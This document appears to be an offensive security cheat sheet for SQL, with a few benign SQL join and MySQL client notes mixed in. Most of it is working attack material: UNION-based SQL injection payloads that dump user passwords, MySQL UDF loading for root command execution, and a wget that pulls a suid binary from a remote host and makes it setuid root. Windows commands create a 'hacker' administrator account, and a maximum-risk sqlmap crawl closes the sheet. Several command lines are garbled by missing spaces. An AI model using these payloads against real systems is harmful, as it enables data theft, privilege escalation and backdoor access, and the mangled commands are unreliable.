
## SQL

### SQLi Examples
```
	secret' or 1=1 limit1;#
	#Find number of columns return by the Select statement
	?id=738 order by 1,2,3,4...n until error is received

	#Use union select statement to append query to the original
	#union Select statement must have same number of columns as original Select statement
	?id=738 union select 1,2,3,4,5,6

	#Get DB Version
	?id=738 union select 1,2,3,4,@@version,6

	#Get DBUser
	?id=738 union select 1,2,3,4,user(),6

	#Get tables from all databases
	?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables

	#Get Table Columns
	?id=738 union select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'

	#Get User passwords
	?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users
```

#### SQL Joins
```
	#FULL All
	SELECT something FROM tableA A FULL OUTER JOIN tableB B ON A.KEY = B.KEY

	#A partial B
	SELECT something FROM tableA A LEFT JOIN tableB B on A.Key = B.Key

	#B Partial A
	SELECT something FROM tableA A RIGHT JOIN tableB B on A.Key = B.Key

	#A no B
	SELECT something FROM tableA A LEFT JOIN tableB B on A.Key = B.Key WHERE B.Key IS NULL

	# Outer
	SELECT something FROM tableA A FULL OUTER JOIN tableB B on A.Key = B.Key WHERE A.Key IS NULL OR B.Key IS NULL

	# Inner
	SELECT something FROM tableA A FULL INNER JOIN tableB B on A.Key = B.Key

```

### MySQL
```
	[mysqldir]/bin/mysql-h hostname-u root --password=pass <database>

	select @@version
	select @@servername

	mysql> show databases;
	mysql> use [db name];
	mysql> show tables;
	mysql> describe [table name];
	mysql> SELECT * FROM [table name];
```

#### UDF Install for Command Execution

User Defined Functions by Platform
```	
	udf/mysql/linux/32/lib_mysqludf_sys.so
	udf/mysql/linux/64/lib_mysqludf_sys.so
	udf/mysql/windows/32/lib_mysqludf_sys.dll
	udf/mysql/windows/64/lib_mysqludf_sys.dll
```
Source: http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/


Load MYSQLUDF for Linux
```	
	use test;
	create table udf(line blob);
	insert into udfvalues(load_file('/tmp/udf/udf.so'));
	select * from udfinto dumpfile'/usr/lib/udf.so';
	create function sys_exec returns integer soname'udf.so';
	select sys_exec('id > /tmp/out; chownapache.apache /tmp/out');
	select sys_exec('ls -alh/root/Desktop/ >> /tmp/out');
	select sys_exec('ls /etc/sudoers>> /tmp/out');
```

Upload suid.c program
```
	wget http://ip:port/privex/mysql/suid-o /tmp/suid
	chownroot:root /tmp/suid
	chmod4777 /tmp/suid
```

Load MYSQLUDFfor Windows
```	
	USE mysql;
	CREATE TABLE npn(line blob);
	INSERT INTO npn values(load_files('C://xampplite//webdav//lib_mysqludf_sys.dll'));
	SELECT * FROM mysql.npnINTO DUMPFILE'c://windows//system32//lib_mysqludf_sys_32.dll';
	CREATE FUNCTION sys_exec RETURNS integer SONAME'lib_mysqludf_sys_32.dll';
	SELECT sys_exec("net user hacker hacker1234!@#$ /add");
	SELECT sys_exec("net localgroupAdministrators hacker /add");
	s_exec('net localgroup"Remote Desktop Users" hacker /add');
```

### SQLMap

Automated website crawl and test of SQLi
```
	python sqlmap.py -u http://example.com --forms --batch --crawl=10 --cookie=jsessionid=12345 --level=5 --risk=3
```
